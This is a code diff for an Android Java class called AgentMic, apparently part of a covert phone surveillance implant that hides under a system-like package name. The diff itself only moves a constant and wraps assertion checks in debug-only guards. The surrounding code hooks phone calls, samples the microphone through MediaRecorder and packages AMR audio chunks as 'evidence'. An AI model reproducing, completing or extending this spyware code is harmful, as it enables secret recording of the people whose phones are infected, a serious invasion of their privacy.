@@ -43,10 +43,9 @@ import com.android.service.util.Utils;
  */
 public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListener, OnInfoListener {
 
+	private static final String TAG = "AgentMic";
 	private static final long MIC_PERIOD = 5000;
 	public static final byte[] AMR_HEADER = new byte[] { 35, 33, 65, 77, 82, 10 };
-
-	private static final String TAG = "AgentMic";
 
 	/** The recorder. */
 	MediaRecorder recorder;
@@ -74,7 +73,7 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 	public void begin() {
 		try {
 
-			Check.requires(status == StateRun.STARTING, "inconsistent status");
+			if(Cfg.DEBUG) Check.requires(status == StateRun.STARTING, "inconsistent status");
 
 			addPhoneListener();
 
@@ -100,7 +99,7 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 	@Override
 	public void end() {
 		if(Cfg.DEBUG) Log.d("QZ", TAG + " (end)");
-		Check.requires(status == StateRun.STOPPING, "state not STOPPING");
+		if(Cfg.DEBUG) Check.requires(status == StateRun.STOPPING, "state not STOPPING");
 
 		removePhoneListener();
 
@@ -118,7 +117,7 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 	 */
 	@Override
 	public void go() {
-		Check.requires(status == StateRun.STARTED, "inconsistent status");
+		if(Cfg.DEBUG) Check.requires(status == StateRun.STARTED, "inconsistent status");
 
 		int amp = recorder.getMaxAmplitude();
 		if (amp != 0) {
@@ -156,7 +155,7 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 
 	private void saveRecorderEvidence() {
 
-		Check.requires(recorder != null, "saveRecorderEvidence recorder==null");
+		if(Cfg.DEBUG) Check.requires(recorder != null, "saveRecorderEvidence recorder==null");
 
 		final byte[] chunk = getAvailable();
 
@@ -300,7 +299,7 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 	 * Stop recorder.
 	 */
 	private synchronized void stopRecorder() {
-		Check.requires(recorder == null, "null recorder");
+		if(Cfg.DEBUG) Check.requires(recorder == null, "null recorder");
 
 		if(Cfg.DEBUG) Log.d("QZ", TAG + " (stopRecorder)");
 
@@ -333,7 +332,7 @@ public class AgentMic extends AgentBase implements Observer<Call>, OnErrorListen
 		databuffer.writeInt(sampleRate | LOG_AUDIO_CODEC_AMR);
 		databuffer.writeLong(fId);
 
-		Check.ensures(additionalData.length == tlen, "Wrong additional data name");
+		if(Cfg.DEBUG) Check.ensures(additionalData.length == tlen, "Wrong additional data name");
 
 		return additionalData;
 	}
